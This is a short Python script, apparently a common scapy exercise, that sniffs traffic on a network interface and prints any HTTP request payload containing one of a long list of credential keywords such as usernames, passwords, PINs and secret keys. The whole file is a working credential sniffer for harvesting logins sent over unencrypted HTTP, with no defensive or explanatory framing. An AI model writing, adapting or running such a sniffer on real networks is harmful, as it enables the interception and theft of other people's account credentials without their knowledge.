import scapy.all as scapy
from scapy.layers import http #for filtering packets

def main():
    sniff("eth0")
    
    
def sniff(interface):
    scapy.sniff(iface=interface,store=False, prn=process_sniffed_packet)
    
    
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            #save it in variable
            load = packet[scapy.Raw].load  # Get the raw data
            # Decode the bytes into a string for keyword matching
            load = load.decode('utf-8', errors='ignore')
            username_terms = ["username", "user", "userid", "user_id", "uname", "login", "login_name",
            "user_name", "email", "email_address", "account", "account_name", "handle", "profile_name", "alias", "member_id", "customer_id", "user_identifier","user_key", "screen_name", "nickname", "auth_user", "login_user", "password", "passwd", "pwd", "pass", "login_password", "user_password", "pin",
            "passcode", "access_code", "secret", "secret_key", "auth_key", "passphrase", "login_key", "user_key", "credentials", "security_code", "auth_password","member_password", "account_password","login_credentials", "auth_credentials", "user_login", "user_auth","user_access", "account_login"]
            for term in username_terms:
                if term in load:
                    print(load)
                    break #just print the first finding of a term
    




if __name__ == "__main__":
    main()

